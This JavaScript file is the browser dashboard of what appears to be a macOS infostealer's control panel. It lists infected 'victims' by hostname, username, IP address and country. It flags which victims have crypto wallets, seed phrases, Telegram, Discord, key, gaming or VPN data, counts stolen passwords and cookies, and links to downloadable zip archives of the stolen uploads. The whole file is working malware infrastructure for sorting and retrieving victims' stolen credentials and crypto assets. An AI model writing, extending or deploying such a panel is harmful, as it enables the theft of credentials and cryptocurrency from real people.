"use strict";

const $ = (sel) => document.querySelector(sel);

let selectedId = null;
let refreshTimer = null;

function fmtDate(iso) {
  if (!iso) return "—";
  const d = new Date(iso);
  return d.toLocaleString();
}

function yesNoBadge(val) {
  return val
    ? '<span class="badge badge-yes">Yes</span>'
    : '<span class="badge badge-no">No</span>';
}

function flag(name, on) {
  return `<span class="flag ${on ? "flag-on" : ""}">${name}</span>`;
}

async function loadStats() {
  const res = await fetch("/api/stats");
  const data = await res.json();
  $("#statVictims").textContent = data.victims ?? 0;
  $("#statUploads").textContent = data.uploads ?? 0;
  $("#statWallets").textContent = data.with_wallet ?? 0;
  $("#statSeeds").textContent = data.with_seeds ?? 0;
  $("#statCountries").textContent = data.countries ?? 0;

  const sel = $("#filterCountry");
  const current = sel.value;
  sel.innerHTML = '<option value="">All countries</option>';
  for (const c of data.countries || []) {
    const opt = document.createElement("option");
    opt.value = c.country_code;
    opt.textContent = `${c.country || c.country_code} (${c.count})`;
    sel.appendChild(opt);
  }
  sel.value = current;
}

function buildQuery() {
  const params = new URLSearchParams();
  const q = $("#filterQ").value.trim();
  const country = $("#filterCountry").value;
  const wallet = $("#filterWallet").value;
  const seeds = $("#filterSeeds").value;
  const sort = $("#filterSort").value;
  if (q) params.set("q", q);
  if (country) params.set("country", country);
  if (wallet) params.set("has_wallet", wallet);
  if (seeds) params.set("has_seeds", seeds);
  if (sort) params.set("sort", sort);
  return params.toString();
}

async function loadVictims() {
  const qs = buildQuery();
  const res = await fetch(`/api/victims?${qs}`);
  const data = await res.json();
  const tbody = $("#victimsBody");
  const rows = data.victims || [];

  if (!rows.length) {
    tbody.innerHTML = '<tr><td colspan="10" class="empty">No victims yet — waiting for uploads</td></tr>';
    return;
  }

  tbody.innerHTML = rows.map((v) => `
    <tr data-id="${v.id}" class="${selectedId === v.id ? "selected" : ""}">
      <td>${esc(v.hostname)}</td>
      <td>${esc(v.mac_username || "—")}</td>
      <td>${esc(v.country_code || v.country || "—")}</td>
      <td>${esc(v.ip_address || "—")}</td>
      <td>${esc(v.arch || "—")}</td>
      <td>${yesNoBadge(v.has_wallet)}</td>
      <td>${yesNoBadge(v.has_seeds)}</td>
      <td>${yesNoBadge(v.has_telegram)}</td>
      <td>${v.password_count}</td>
      <td>${fmtDate(v.last_seen)}</td>
    </tr>
  `).join("");

  tbody.querySelectorAll("tr[data-id]").forEach((tr) => {
    tr.addEventListener("click", () => selectVictim(parseInt(tr.dataset.id, 10)));
  });
}

function esc(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

async function selectVictim(id) {
  selectedId = id;
  await loadVictims();

  const res = await fetch(`/api/victims/${id}`);
  if (!res.ok) return;
  const { victim: v, uploads } = await res.json();

  $("#detailEmpty").classList.add("hidden");
  $("#detailContent").classList.remove("hidden");
  $("#detailTitle").textContent = v.hostname;

  $("#detailMeta").innerHTML = `
    <div><strong>User:</strong> ${esc(v.mac_username || "—")}</div>
    <div><strong>IP:</strong> ${esc(v.ip_address || "—")}</div>
    <div><strong>Location:</strong> ${esc([v.city, v.country].filter(Boolean).join(", ") || "—")}</div>
    <div><strong>OS/Arch:</strong> ${esc(v.os || "—")} / ${esc(v.arch || "—")}</div>
    <div><strong>First seen:</strong> ${fmtDate(v.first_seen)}</div>
    <div><strong>Last seen:</strong> ${fmtDate(v.last_seen)}</div>
    <div><strong>Uploads:</strong> ${v.upload_count}</div>
  `;

  $("#detailFlags").innerHTML = [
    flag("Wallet", v.has_wallet),
    flag("Seeds", v.has_seeds),
    flag("Telegram", v.has_telegram),
    flag("Discord", v.has_discord),
    flag("Keys", v.has_keys),
    flag("Gaming", v.has_gaming),
    flag("VPN", v.has_vpn),
  ].join("");

  const counts = [
    ["Passwords", v.password_count],
    ["Cookies", v.cookie_count],
    ["Wallets", v.wallet_count],
    ["Extensions", v.extension_count],
    ["Seeds", v.seed_count],
    ["Keys", v.key_count],
    ["Telegram", v.telegram_count],
    ["PW candidates", v.candidate_count],
    ["Gaming", v.gaming_count],
    ["VPNs", v.vpn_count],
  ];

  $("#detailCounts").innerHTML = counts.map(([k, n]) =>
    `<div class="count-item"><span>${k}</span><strong>${n}</strong></div>`
  ).join("");

  $("#detailUploads").innerHTML = (uploads || []).map((u) => `
    <li>
      <div><strong>${esc(u.phase)}</strong> — ${esc(u.filename)}</div>
      <div>${esc(u.title || "")}</div>
      <div>${fmtDate(u.uploaded_at)} · ${(u.file_size / 1024).toFixed(1)} KB · part ${u.part_num}/${u.part_total}</div>
      <a href="/api/uploads/${u.id}/download">Download zip</a>
    </li>
  `).join("") || "<li>No uploads</li>";
}

function scheduleRefresh() {
  clearTimeout(refreshTimer);
  refreshTimer = setTimeout(async () => {
    await loadStats();
    await loadVictims();
    if (selectedId) await selectVictim(selectedId);
  }, 300);
}

async function init() {
  ["filterQ", "filterCountry", "filterWallet", "filterSeeds", "filterSort"].forEach((id) => {
    $(`#${id}`).addEventListener("input", scheduleRefresh);
    $(`#${id}`).addEventListener("change", scheduleRefresh);
  });
  $("#btnRefresh").addEventListener("click", async () => {
    await loadStats();
    await loadVictims();
    if (selectedId) await selectVictim(selectedId);
  });

  await loadStats();
  await loadVictims();
  setInterval(async () => {
    await loadStats();
    await loadVictims();
  }, 15000);
}

init();